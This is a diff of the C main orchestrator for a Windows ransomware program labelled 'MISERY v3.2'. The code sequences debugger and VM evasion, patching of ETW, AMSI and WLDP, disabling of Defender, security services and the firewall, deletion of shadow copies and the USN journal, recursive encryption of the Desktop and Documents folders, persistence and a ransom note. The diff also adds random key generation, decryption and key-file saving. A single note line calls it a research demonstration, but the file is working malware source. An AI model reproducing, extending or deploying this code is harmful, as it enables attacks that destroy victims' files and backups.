@@ -8,420 +8,527 @@
 #include "ransomnote.h"
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdint.h>
 #include <string.h>
 #include <stdbool.h>
 #include <windows.h>
 #include <time.h>
 #include <shlobj.h>
 
-/* ============================================================
- * MISERY ORCHESTRATION ENGINE
- * Main entry point that coordinates all subsystems
- * ============================================================ */
-
 #define KEYFILE "misery.key"
 #define MAX_TARGETS 100
-#define ENCRYPTION_TIMEOUT_MS 300000  /* 5 minutes */
+#define ENCRYPTION_TIMEOUT_MS 300000
 
-/* Target directories for encryption */
-static const char *g_target_dirs[] = {
+/* Target directories for encryption/decryption */
+/* FIX: Removed the project source directory from targets so misery.key is safe */
+const char *g_target_dirs[] = {
     "C:\\Users\\jahan\\OneDrive\\Desktop",
     "C:\\Users\\jahan\\Documents",
     NULL
 };
 
-/* ============================================================
- * RANSOM NOTE CONTENT
- * ============================================================ */
-static const char *GetRansomNoteContent(void) {
-    static char note_buffer[4096] = {0};
-    if (note_buffer[0] == 0) {
-        snprintf(note_buffer, sizeof(note_buffer),
-            "========================================\n"
-            "YOUR FILES HAVE BEEN ENCRYPTED\n"
-            "========================================\n"
-            "This is a research project demonstration.\n"
-            "For authorized penetration tests only.\n"
-            "========================================\n");
+/* ═══════════════════════════════════════════════════════════════
+ * Generate random 20-character alphanumeric key
+ * ═══════════════════════════════════════════════════════════════ */
+static void GenerateRandomKey(char *key, DWORD keySize) {
+    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                           "abcdefghijklmnopqrstuvwxyz"
+                           "0123456789";
+    const DWORD charsetLen = (DWORD)(sizeof(charset) - 1);
+
+    /* Use CryptoAPI for true random bytes */
+    HCRYPTPROV hProv = 0;
+    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        BYTE randomBytes[32];
+        if (CryptGenRandom(hProv, 20, randomBytes)) {
+            for (DWORD i = 0; i < 20; i++) {
+                key[i] = charset[randomBytes[i] % charsetLen];
+            }
+            key[20] = '\0';
+            CryptReleaseContext(hProv, 0);
+            return;
+        }
+        CryptReleaseContext(hProv, 0);
     }
-    return note_buffer;
+
+    /* Fallback: use rand() seeded with tick count */
+    srand(GetTickCount());
+    for (DWORD i = 0; i < 20; i++) {
+        key[i] = charset[rand() % charsetLen];
+    }
+    key[20] = '\0';
 }
 
-/* ============================================================
- * PHASE EXECUTION: Anti-Analysis
- * ============================================================ */
-static bool ExecutePhaseAntiAnalysis(void) {
-    MiseryLog(MISERY_LOG_INFO, "Starting ANTI-ANALYSIS phase...");
-    
-    bool success = true;
-    
-    /* Check for debuggers and analysis tools */
-    if (DefenseCheckDebugger()) {
-        MiseryLog(MISERY_LOG_WARN, "Debugger detected! Aborting execution.");
+/* ═══════════════════════════════════════════════════════════════
+ * Decryption engine — called from ransom note GUI
+ * ═══════════════════════════════════════════════════════════════ */
+bool MiseryRunDecrypt(const char *key, FILEOPS_STATS *outStats) {
+    if (!key || !*key) {
+        MiseryLog(MISERY_LOG_ERROR, "Decrypt: No key provided");
         return false;
     }
-    
-    if (DefenseDetectAnalysisTools()) {
-        MiseryLog(MISERY_LOG_WARN, "Analysis tools detected! Proceeding with caution.");
-        success = false;  /* Log but continue */
-    }
-    
-    if (DefenseDetectVirtualMachine()) {
-        MiseryLog(MISERY_LOG_WARN, "Virtual machine detected! Proceeding with caution.");
-        success = false;  /* Log but continue */
-    }
-    
-    return MiseryPhaseTransition(PHASE_ANTI_ANALYSIS, success);
-}
 
-/* ============================================================
- * PHASE EXECUTION: Defense Patching
- * ============================================================ */
-static bool ExecutePhaseDefensePatching(void) {
-    MiseryLog(MISERY_LOG_INFO, "Starting DEFENSE PATCHING phase...");
-    
-    bool success = true;
-    
-    /* Patch ETW (Event Tracing for Windows) */
-    if (!DefensePatchETW()) {
-        MiseryLog(MISERY_LOG_WARN, "ETW patching failed");
-        success = false;
-    }
-    
-    /* Patch AMSI (Antimalware Scan Interface) */
-    if (!DefensePatchAMSI()) {
-        MiseryLog(MISERY_LOG_WARN, "AMSI patching failed");
-        success = false;
-    }
-    
-    /* Patch WLDP (Windows Lockdown Policy) */
-    if (!DefensePatchWLDP()) {
-        MiseryLog(MISERY_LOG_WARN, "WLDP patching failed");
-        success = false;
-    }
-    
-    /* Hide from debugger */
-    DefenseHideFromDebugger();
-    
-    DefenseResetSecurityChecks();
-    
-    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
-}
+    MiseryLog(MISERY_LOG_INFO, "Decrypt: Starting decryption with user-provided key");
 
-/* ============================================================
- * PHASE EXECUTION: Security Disabling
- * ============================================================ */
-static bool ExecutePhaseSecurityDisable(void) {
-    MiseryLog(MISERY_LOG_INFO, "Starting SECURITY DISABLE phase...");
-    
-    bool success = true;
-    
-    /* Disable Windows Defender */
-    if (!SecurityDisableDefender()) {
-        MiseryLog(MISERY_LOG_WARN, "Defender disable failed");
-        success = false;
-    }
-    
-    /* Kill security services */
-    if (!SecurityKillSecurityServices()) {
-        MiseryLog(MISERY_LOG_WARN, "Security service termination failed");
-        success = false;
-    }
-    
-    /* Disable Windows Firewall */
-    if (!SecurityDisableFirewall()) {
-        MiseryLog(MISERY_LOG_WARN, "Firewall disable failed");
-        success = false;
-    }
-    
-    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
-}
+    /* Step 1: Find the first .encrypted file to extract the salt */
+    BYTE salt[SALT_SIZE] = {0};
+    bool saltFound = false;
 
-/* ============================================================
- * PHASE EXECUTION: Backup Destruction
- * ============================================================ */
-static bool ExecutePhaseBackupDestroy(void) {
-    MiseryLog(MISERY_LOG_INFO, "Starting BACKUP DESTRUCTION phase...");
-    
-    bool success = true;
-    
-    /* Destroy Volume Shadow Copies */
-    if (!UtilsNukeBackups()) {
-        MiseryLog(MISERY_LOG_WARN, "Backup nuke failed");
-        success = false;
-    }
-    
-    /* Wipe USN Journal */
-    if (!UtilsWipeUSNJournal()) {
-        MiseryLog(MISERY_LOG_WARN, "USN Journal wipe failed");
-        success = false;
-    }
-    
-    return MiseryPhaseTransition(PHASE_BACKUP_DESTROY, success);
-}
+    for (int i = 0; g_target_dirs[i] && !saltFound; i++) {
+        char searchPath[FILEOPS_MAX_PATH];
+        snprintf(searchPath, sizeof(searchPath), "%s\\*%s", g_target_dirs[i], ENC_EXT);
 
-/* ============================================================
- * PHASE EXECUTION: File Encryption (via FileOps)
- * ============================================================ */
-static bool ExecutePhaseEncryption(bool decryptmode) {
-    MISERY_PHASE target_phase = PHASE_ENCRYPTION;
-    MiseryLog(MISERY_LOG_INFO, "Starting ENCRYPTION phase (mode: %s)...", 
-              decryptmode ? "DECRYPT" : "ENCRYPT");
-    
-    bool success = true;
+        WIN32_FIND_DATAA fd;
+        HANDLE hFind = FindFirstFileA(searchPath, &fd);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            char encFilePath[FILEOPS_MAX_PATH];
+            snprintf(encFilePath, sizeof(encFilePath), "%s\\%s", g_target_dirs[i], fd.cFileName);
+
+            HANDLE hSalt = CreateFileA(encFilePath, GENERIC_READ, FILE_SHARE_READ,
+                                       NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hSalt != INVALID_HANDLE_VALUE) {
+                DWORD readBytes = 0;
+                if (ReadFile(hSalt, salt, SALT_SIZE, &readBytes, NULL) && readBytes == SALT_SIZE) {
+                    saltFound = true;
+                    MiseryLog(MISERY_LOG_INFO, "Decrypt: Extracted salt from %s", encFilePath);
+                }
+                CloseHandle(hSalt);
+            }
+            FindClose(hFind);
+        }
+    }
+
+    if (!saltFound) {
+        MiseryLog(MISERY_LOG_WARN, "Decrypt: No encrypted files found in target directories");
+        if (outStats) {
+            outStats->filesSucceeded = 0;
+            outStats->filesFailed = 0;
+            outStats->bytesProcessed = 0;
+        }
+        return true; /* Nothing to do isn't a failure */
+    }
+
+    /* Step 2: Cleanup existing crypto and re-init with the user's key and extracted salt */
+    CleanupCrypto();
+
+    CRYPTO_ERROR cerr = InitCrypto(key, strlen(key), salt);
+    if (cerr != CRYPTO_SUCCESS) {
+        MiseryLog(MISERY_LOG_ERROR, "Decrypt: InitCrypto failed: %s (code=%d)",
+                  GetErrorString(cerr), cerr);
+        return false;
+    }
+
+    MiseryLog(MISERY_LOG_INFO, "Decrypt: Crypto initialized with user key");
+
+    /* Step 3: Configure and run fileops in decrypt mode */
     FILEOPS_CONFIG cfg = {0};
-    
-    /* Get crypto context - MUST be valid */
-    CRYPTO_CTX *crypto_ctx = GetCryptoCtx();
-    if (!crypto_ctx || !crypto_ctx->initialized) {
-        MiseryLog(MISERY_LOG_ERROR, "Crypto context not initialized!");
-        return MiseryPhaseTransition(target_phase, false);
-    }
-    
-    /* Configure file operations */
     cfg.threadCount = 8;
     cfg.ioBufferSize = (64 * 1024);
     cfg.flags = FILEOPS_FLAG_RECURSIVE;
     cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
-    cfg.crypto_ctx = crypto_ctx;  /* PASS CRYPTO CONTEXT EXPLICITLY */
-    
-    MiseryLog(MISERY_LOG_INFO, "FileOps config: crypto_ctx=%p, threads=%lu", 
+    cfg.crypto_ctx = GetCryptoCtx();
+    cfg.decryptMode = true;
+
+    FILEOPS_CTX *fctx = FileOps_CreateContext(&cfg);
+    if (!fctx) {
+        MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to create FileOps context");
+        return false;
+    }
+
+    for (int i = 0; g_target_dirs[i] != NULL; i++) {
+        MiseryLog(MISERY_LOG_INFO, "Decrypt: Processing directory: %s", g_target_dirs[i]);
+        WCHAR wide_path[FILEOPS_MAX_PATH];
+        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1, wide_path, FILEOPS_MAX_PATH);
+        FileOps_TraverseAndQueue(fctx, wide_path);
+    }
+
+    MiseryLog(MISERY_LOG_INFO, "Decrypt: Waiting for decryption to complete...");
+    FileOps_WaitForCompletion(fctx);
+
+    if (outStats) {
+        FileOps_GetStats(fctx, outStats);
+    }
+
+    FILEOPS_STATS stats;
+    FileOps_GetStats(fctx, &stats);
+    MiseryLog(MISERY_LOG_INFO, "Decrypt: Complete — %lld succeeded, %lld failed, %lld bytes",
+              stats.filesSucceeded, stats.filesFailed, stats.bytesProcessed);
+
+    FileOps_DestroyContext(fctx);
+    return true;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+ * PHASE EXECUTIONS
+ * ═══════════════════════════════════════════════════════════════ */
+
+static bool ExecutePhaseAntiAnalysis(void) {
+    MiseryLog(MISERY_LOG_INFO, "Starting ANTI-ANALYSIS phase...");
+    bool success = true;
+    if (DefenseCheckDebugger()) {
+        MiseryLog(MISERY_LOG_WARN, "Debugger detected! Aborting.");
+        return false;
+    }
+    if (DefenseDetectAnalysisTools()) {
+        MiseryLog(MISERY_LOG_WARN, "Analysis tools detected!");
+        success = false;
+    }
+    if (DefenseDetectVirtualMachine()) {
+        MiseryLog(MISERY_LOG_WARN, "VM detected!");
+        success = false;
+    }
+    return MiseryPhaseTransition(PHASE_ANTI_ANALYSIS, success);
+}
+
+static bool ExecutePhaseDefensePatching(void) {
+    MiseryLog(MISERY_LOG_INFO, "Starting DEFENSE PATCHING phase...");
+    bool success = true;
+    if (!DefensePatchETW())        { MiseryLog(MISERY_LOG_WARN, "ETW patch failed");  success = false; }
+    if (!DefensePatchAMSI())       { MiseryLog(MISERY_LOG_WARN, "AMSI patch failed"); success = false; }
+    if (!DefensePatchWLDP())       { MiseryLog(MISERY_LOG_WARN, "WLDP patch failed"); success = false; }
+    DefenseHideFromDebugger();
+    DefenseResetSecurityChecks();
+    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
+}
+
+static bool ExecutePhaseSecurityDisable(void) {
+    MiseryLog(MISERY_LOG_INFO, "Starting SECURITY DISABLE phase...");
+    bool success = true;
+    if (!SecurityDisableDefender())      { MiseryLog(MISERY_LOG_WARN, "Defender disable failed");  success = false; }
+    if (!SecurityKillSecurityServices()) { MiseryLog(MISERY_LOG_WARN, "Svc kill failed");          success = false; }
+    if (!SecurityDisableFirewall())      { MiseryLog(MISERY_LOG_WARN, "Firewall disable failed");  success = false; }
+    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
+}
+
+static bool ExecutePhaseBackupDestroy(void) {
+    MiseryLog(MISERY_LOG_INFO, "Starting BACKUP DESTROY phase...");
+    bool success = true;
+    if (!UtilsNukeBackups())     { MiseryLog(MISERY_LOG_WARN, "VSS nuke failed");  success = false; }
+    if (!UtilsWipeUSNJournal())  { MiseryLog(MISERY_LOG_WARN, "USN wipe failed");  success = false; }
+    return MiseryPhaseTransition(PHASE_BACKUP_DESTROY, success);
+}
+
+static bool ExecutePhaseEncryption(void) {
+    MiseryLog(MISERY_LOG_INFO, "Starting ENCRYPTION phase...");
+    bool success = true;
+    FILEOPS_CONFIG cfg = {0};
+
+    CRYPTO_CTX *crypto_ctx = GetCryptoCtx();
+    if (!crypto_ctx || !crypto_ctx->initialized) {
+        MiseryLog(MISERY_LOG_ERROR, "Crypto context not initialized!");
+        return MiseryPhaseTransition(PHASE_ENCRYPTION, false);
+    }
+
+    cfg.threadCount = 8;
+    cfg.ioBufferSize = (64 * 1024);
+    cfg.flags = FILEOPS_FLAG_RECURSIVE;
+    cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
+    cfg.crypto_ctx = crypto_ctx;
+    cfg.decryptMode = false;
+
+    MiseryLog(MISERY_LOG_INFO, "FileOps config: crypto_ctx=%p, threads=%lu",
               cfg.crypto_ctx, cfg.threadCount);
-    
-    /* Initialize file operations context */
+
     FILEOPS_CTX *fileops_ctx = FileOps_CreateContext(&cfg);
     if (!fileops_ctx) {
         MiseryLog(MISERY_LOG_ERROR, "Failed to create FileOps context");
-        return MiseryPhaseTransition(target_phase, false);
+        return MiseryPhaseTransition(PHASE_ENCRYPTION, false);
     }
-    
-    /* Process each target directory */
+
     for (int i = 0; g_target_dirs[i] != NULL; i++) {
-        MiseryLog(MISERY_LOG_INFO, "Processing directory: %s", g_target_dirs[i]);
-        
-        /* Convert to wide character for FileOps */
-        WCHAR wide_path[32768];
-        int wlen = MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
-                                        wide_path, 32768);
-        if (wlen <= 0) {
-            MiseryLog(MISERY_LOG_WARN, "Path conversion failed for: %s", g_target_dirs[i]);
-            success = false;
-            continue;
-        }
-        
-        /* Queue files for processing */
+        WCHAR wide_path[FILEOPS_MAX_PATH];
+        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1, wide_path, FILEOPS_MAX_PATH);
         FileOps_TraverseAndQueue(fileops_ctx, wide_path);
     }
-    
-    /* Wait for all encryption operations to complete */
-    MiseryLog(MISERY_LOG_INFO, "Waiting for file operations to complete...");
+
     FileOps_WaitForCompletion(fileops_ctx);
-    
-    /* Get statistics */
+
     FILEOPS_STATS stats = {0};
     FileOps_GetStats(fileops_ctx, &stats);
-    
-    MiseryLog(MISERY_LOG_INFO, "Encryption stats: %lld bytes processed, %lld succeeded, %lld failed",
+
+    MiseryLog(MISERY_LOG_INFO, "Encryption stats: %lld bytes, %lld succeeded, %lld failed",
               stats.bytesProcessed, stats.filesSucceeded, stats.filesFailed);
-    
-    /* Update global context statistics */
+
     g_misery_ctx.filesEncrypted = (DWORD)stats.filesSucceeded;
     g_misery_ctx.filesFailed = (DWORD)stats.filesFailed;
     g_misery_ctx.bytesEncrypted = stats.bytesProcessed;
-    
-    /* Cleanup file operations */
+
     FileOps_DestroyContext(fileops_ctx);
-    
-    return MiseryPhaseTransition(target_phase, success && stats.filesFailed == 0);
+    return MiseryPhaseTransition(PHASE_ENCRYPTION, success);
 }
 
-/* ============================================================
- * PHASE EXECUTION: Persistence Installation
- * ============================================================ */
 static bool ExecutePhasePeristence(void) {
     MiseryLog(MISERY_LOG_INFO, "Starting PERSISTENCE phase...");
-    
-    bool success = true;
-    
-    /* Install all persistence mechanisms */
-    if (!PersistenceInstallAll()) {
-        MiseryLog(MISERY_LOG_WARN, "Persistence installation encountered issues");
-        success = false;
-    }
-    
+    bool success = PersistenceInstallAll();
     return MiseryPhaseTransition(PHASE_PERSISTENCE, success);
 }
 
-/* ============================================================
- * PHASE EXECUTION: Ransom Note Delivery
- * ============================================================ */
 static bool ExecutePhaseRansomNote(void) {
     MiseryLog(MISERY_LOG_INFO, "Starting RANSOM NOTE phase...");
-
     bool success = true;
 
-    /* Drop text-based ransom note on desktop */
-    const char *note_content = GetRansomNoteContent();
+    /* Drop text note on desktop */
+    const char *note_content =
+        "========================================\n"
+        "YOUR FILES HAVE BEEN ENCRYPTED\n"
+        "========================================\n"
+        "This is a research project demonstration.\n"
+        "For authorized penetration tests only.\n"
+        "========================================\n";
+
     char desktop_path[MAX_PATH];
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
         char note_path[MAX_PATH * 2];
         snprintf(note_path, sizeof(note_path), "%s\\README.txt", desktop_path);
-
-        if (!UtilsDropRansomNote(note_path, note_content)) {
-            MiseryLog(MISERY_LOG_WARN, "Failed to drop ransom note on desktop");
-            success = false;
-        }
+        if (!UtilsDropRansomNote(note_path, note_content)) success = false;
     }
 
-    /* Show the GUI window — BLOCKING, stays until user clicks CLOSE */
-    MiseryLog(MISERY_LOG_INFO, "Showing ransom note window (blocking)...");
+    /* Show GUI window — BLOCKING */
     ShowRansomNoteWindow();
-
-    MiseryLog(MISERY_LOG_INFO, "Ransom note window dismissed by user");
 
     return MiseryPhaseTransition(PHASE_RANSOM_NOTE, success);
 }
 
-/* ============================================================
- * PHASE EXECUTION: Cleanup
- * ============================================================ */
 static bool ExecutePhaseCleanup(void) {
     MiseryLog(MISERY_LOG_INFO, "Starting CLEANUP phase...");
-    
     CleanupCrypto();
-    
     return MiseryPhaseTransition(PHASE_CLEANUP, true);
 }
 
-/* ============================================================
- * MAIN ORCHESTRATION
- * ============================================================ */
-int main(int argc, char **argv) {
-    DWORD start_time = GetTickCount();
-    
-    /* Initialize context */
-    if (!MiseryInitContext()) {
-        puts("[!] Failed to initialize context");
-        return 1;
-    }
-    
-    puts("========== MISERY v3.2 RANSOMWARE ENGINE ==========");
-    MiseryLog(MISERY_LOG_INFO, "=== MISERY INITIALIZATION ===");
-    
-    /* Parse command line */
-    bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);
-    MiseryLog(MISERY_LOG_INFO, "Mode: %s", decryptmode ? "DECRYPT" : "ENCRYPT");
-    
-    /* Crypto initialization */
-    const char *keyfile = KEYFILE;
-    char key[256] = {0};
-    BYTE salt[SALT_SIZE] = {0};
-    
-    if (!decryptmode) {
-        /* Encryption mode: generate new crypto context */
-        snprintf(key, sizeof(key), "Thejahanzaib@1318");
-        
-        if (InitCrypto(key, strlen(key), NULL) != CRYPTO_SUCCESS) {
-            MiseryLog(MISERY_LOG_ERROR, "Failed to initialize crypto!");
-            MiseryCleanupContext();
-            return 1;
-        }
-        memcpy(salt, GetCryptoCtx()->salt, SALT_SIZE);
-        
-        /* Save key and salt */
-        FILE *kf = fopen(keyfile, "wb");
+/* ═══════════════════════════════════════════════════════════════
+ * Save key file to a safe location OUTSIDE all target directories
+ * ═══════════════════════════════════════════════════════════════ */
+static bool SaveKeyFile(const char *key, const BYTE *salt) {
+    int savedCount = 0;
+
+    /* ── Location 1: Desktop (user-visible, expected location) ── */
+    char desktop[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
+        char keyPath[MAX_PATH * 2];
+        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", desktop);
+        FILE *kf = fopen(keyPath, "wb");
         if (kf) {
             fwrite(salt, 1, SALT_SIZE, kf);
             fprintf(kf, "%s\n", key);
             fclose(kf);
-            MiseryLog(MISERY_LOG_INFO, "Key and salt saved to %s", keyfile);
+            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
+            savedCount++;
+        } else {
+            MiseryLog(MISERY_LOG_WARN, "Failed to save key to Desktop: %s (err: %d)",
+                      keyPath, GetLastError());
         }
-    } else {
-        /* Decryption mode: load crypto context from file */
-        FILE *kf = fopen(keyfile, "rb");
+    }
+
+    /* ── Location 2: %%TEMP%% (system temp, outside all target dirs) ── */
+    char tempPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tempPath)) {
+        char keyPath[MAX_PATH * 2];
+        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", tempPath);
+        FILE *kf = fopen(keyPath, "wb");
+        if (kf) {
+            fwrite(salt, 1, SALT_SIZE, kf);
+            fprintf(kf, "%s\n", key);
+            fclose(kf);
+            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
+            savedCount++;
+        } else {
+            MiseryLog(MISERY_LOG_WARN, "Failed to save key to TEMP: %s (err: %d)",
+                      keyPath, GetLastError());
+        }
+    }
+
+    /* ── Location 3: CWD (project directory) — safe with new skip logic ── */
+    char cwd[MAX_PATH];
+    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
+        char keyPath[MAX_PATH * 2];
+        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", cwd);
+        /* Avoid writing CWD key if it happens to be Desktop or TEMP (no duplicates) */
+        if (_stricmp(cwd, desktop) != 0 &&
+            (GetTempPathA(MAX_PATH, tempPath) && _stricmp(cwd, tempPath) != 0)) {
+            FILE *kf = fopen(keyPath, "wb");
+            if (kf) {
+                fwrite(salt, 1, SALT_SIZE, kf);
+                fprintf(kf, "%s\n", key);
+                fclose(kf);
+                MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
+                savedCount++;
+            } else {
+                MiseryLog(MISERY_LOG_WARN, "Failed to save key to CWD: %s (err: %d)",
+                          keyPath, GetLastError());
+            }
+        }
+    }
+
+    return savedCount > 0;
+}
+
+    /* Fallback to current directory — but this will be skipped by fileops */
+bool save_key_to_file(const char *key, const uint8_t *salt) {
+    FILE *kf = fopen("misery.key", "wb");
+    if (kf) {
+        fwrite(salt, 1, SALT_SIZE, kf);
+        fprintf(kf, "%s\n", key);
+        fclose(kf);
+        MiseryLog(MISERY_LOG_INFO, "Key saved to: misery.key (CWD)");
+        return true;
+    }
+    return false;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+ * Try to open key file from any known safe location
+ * ═══════════════════════════════════════════════════════════════ */
+static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
+    /* Try %TEMP% first */
+    char tempPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tempPath)) {
+        snprintf(outPath, outPathSize, "%s\\misery.key", tempPath);
+        FILE *kf = fopen(outPath, "rb");
+        if (kf) return kf;
+    }
+
+    /* Try desktop */
+    char desktop[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
+        snprintf(outPath, outPathSize, "%s\\misery.key", desktop);
+        FILE *kf = fopen(outPath, "rb");
+        if (kf) return kf;
+    }
+
+    /* Try CWD */
+    snprintf(outPath, outPathSize, "misery.key");
+    FILE *kf = fopen(outPath, "rb");
+    if (kf) return kf;
+
+    return NULL;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+ * MAIN
+ * ═══════════════════════════════════════════════════════════════ */
+int main(int argc, char **argv) {
+    DWORD start_time = GetTickCount();
+
+    if (!MiseryInitContext()) {
+        puts("[!] Failed to initialize context");
+        return 1;
+    }
+
+    puts("========== MISERY v3.2 RANSOMWARE ENGINE ==========");
+    MiseryLog(MISERY_LOG_INFO, "=== MISERY INITIALIZATION ===");
+
+    /* Parse command line */
+    bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);
+
+    if (decryptmode) {
+        /* ── DECRYPT MODE (command line) ── */
+        MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");
+
+        char keyfilePath[MAX_PATH * 2] = {0};
+        char key[256] = {0};
+        BYTE salt[SALT_SIZE] = {0};
+
+        FILE *kf = OpenKeyFile(keyfilePath, sizeof(keyfilePath));
         if (!kf) {
-            MiseryLog(MISERY_LOG_ERROR, "Missing %s!", keyfile);
+            MiseryLog(MISERY_LOG_ERROR, "Missing misery.key! Cannot decrypt.");
             MiseryCleanupContext();
             return 1;
         }
-        fread(salt, 1, SALT_SIZE, kf);
-        fgets(key, sizeof(key), kf);
+        if (fread(salt, 1, SALT_SIZE, kf) != SALT_SIZE) {
+            MiseryLog(MISERY_LOG_ERROR, "Failed to read salt from %s", keyfilePath);
+            fclose(kf);
+            MiseryCleanupContext();
+            return 1;
+        }
+        if (!fgets(key, sizeof(key), kf)) {
+            MiseryLog(MISERY_LOG_ERROR, "Failed to read key from %s", keyfilePath);
+            fclose(kf);
+            MiseryCleanupContext();
+            return 1;
+        }
         key[strcspn(key, "\r\n")] = 0;
         fclose(kf);
-        
+
+        MiseryLog(MISERY_LOG_INFO, "Decrypt: salt and key loaded from %s", keyfilePath);
+
         if (InitCrypto(key, strlen(key), salt) != CRYPTO_SUCCESS) {
-            MiseryLog(MISERY_LOG_ERROR, "Failed to initialize crypto for decrypt!");
+            MiseryLog(MISERY_LOG_ERROR, "InitCrypto failed for decrypt!");
             MiseryCleanupContext();
             return 1;
         }
-        MiseryLog(MISERY_LOG_INFO, "Decrypt mode: salt and key loaded from %s", keyfile);
+
+        FILEOPS_STATS stats = {0};
+        if (MiseryRunDecrypt(key, &stats)) {
+            MiseryLog(MISERY_LOG_INFO, "Decrypt: %lld files decrypted, %lld failed",
+                      stats.filesSucceeded, stats.filesFailed);
+        } else {
+            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed");
+        }
+
+        CleanupCrypto();
+        MiseryCleanupContext();
+        printf("[+] Done\n");
+        return 0;
     }
-    
-    /* Execute phases in sequence */
-    MiseryLog(MISERY_LOG_INFO, "=== PHASE EXECUTION SEQUENCE ===");
-    
-    /* Phase 1: Anti-Analysis */
-    if (!ExecutePhaseAntiAnalysis()) {
-        MiseryLog(MISERY_LOG_WARN, "Anti-analysis phase failed");
-        /* Continue anyway */
-    }
-    
-    /* Phase 2: Defense Patching */
-    if (!ExecutePhaseDefensePatching()) {
-        MiseryLog(MISERY_LOG_WARN, "Defense patching phase encountered issues");
-        /* Continue anyway */
-    }
-    
-    /* Phase 3: Security Disable */
-    if (!ExecutePhaseSecurityDisable()) {
-        MiseryLog(MISERY_LOG_WARN, "Security disable phase encountered issues");
-        /* Continue anyway */
-    }
-    
-    /* Phase 4: Backup Destruction */
-    if (!ExecutePhaseBackupDestroy()) {
-        MiseryLog(MISERY_LOG_WARN, "Backup destruction phase encountered issues");
-        /* Continue anyway */
-    }
-    
-    /* Phase 5: Encryption (main payload) */
-    if (!ExecutePhaseEncryption(decryptmode)) {
-        MiseryLog(MISERY_LOG_ERROR, "Encryption phase failed");
+
+    /* ── ENCRYPT MODE ── */
+    MiseryLog(MISERY_LOG_INFO, "Mode: ENCRYPT");
+
+    /* Generate random 20-character key */
+    char key[256] = {0};
+    GenerateRandomKey(key, sizeof(key));
+    MiseryLog(MISERY_LOG_INFO, "Generated random encryption key: %s", key);
+
+    /* Initialize crypto with random salt */
+    if (InitCrypto(key, strlen(key), NULL) != CRYPTO_SUCCESS) {
+        MiseryLog(MISERY_LOG_ERROR, "Failed to initialize crypto!");
         MiseryCleanupContext();
         return 1;
     }
-    
-    /* Phase 6: Persistence (only in encrypt mode) */
-    if (!decryptmode) {
-        if (!ExecutePhasePeristence()) {
-            MiseryLog(MISERY_LOG_WARN, "Persistence phase encountered issues");
-            /* Continue anyway */
-        }
-        
-        /* Phase 7: Ransom Note */
-        if (!ExecutePhaseRansomNote()) {
-            MiseryLog(MISERY_LOG_WARN, "Ransom note phase encountered issues");
-            /* Continue anyway */
-        }
+
+  /* ── Save key to ALL safe locations ── */
+if (!SaveKeyFile(key, GetCryptoCtx()->salt)) {
+    MiseryLog(MISERY_LOG_ERROR, "CRITICAL: Failed to save key to ANY location!");
+} else {
+    MiseryLog(MISERY_LOG_INFO, "Key file saved successfully to at least one location.");
+}
+    /* Phase 1: Anti-Analysis */
+    if (!ExecutePhaseAntiAnalysis()) {
+        MiseryLog(MISERY_LOG_WARN, "Anti-analysis failed, continuing...");
     }
-    
+
+    /* Phase 2: Defense Patching */
+    ExecutePhaseDefensePatching();
+
+    /* Phase 3: Security Disable */
+    ExecutePhaseSecurityDisable();
+
+    /* Phase 4: Backup Destruction */
+    ExecutePhaseBackupDestroy();
+
+    /* Phase 5: Encryption */
+    if (!ExecutePhaseEncryption()) {
+        MiseryLog(MISERY_LOG_ERROR, "Encryption phase failed!");
+        MiseryCleanupContext();
+        return 1;
+    }
+
+    /* Phase 6: Persistence */
+    ExecutePhasePeristence();
+
+    /* Phase 7: Ransom Note (includes decrypt GUI) */
+    ExecutePhaseRansomNote();
+
     /* Phase 8: Cleanup */
-    if (!ExecutePhaseCleanup()) {
-        MiseryLog(MISERY_LOG_WARN, "Cleanup phase encountered issues");
-    }
-    
-    /* Calculate execution time */
-    DWORD end_time = GetTickCount();
-    g_misery_ctx.executionTimeMs = (end_time - start_time);
-    
-    /* Report final statistics */
+    ExecutePhaseCleanup();
+
+    g_misery_ctx.executionTimeMs = GetTickCount() - start_time;
+
     MiseryLog(MISERY_LOG_INFO, "=== EXECUTION COMPLETE ===");
     MiseryReportStats();
-    
-    /* Final cleanup */
     MiseryCleanupContext();
-    
-    MiseryLog(MISERY_LOG_INFO, "Total execution time: %lu ms", g_misery_ctx.executionTimeMs);
+
+    MiseryLog(MISERY_LOG_INFO, "Total time: %lu ms", g_misery_ctx.executionTimeMs);
     puts("[+] Done");
     return 0;
 }
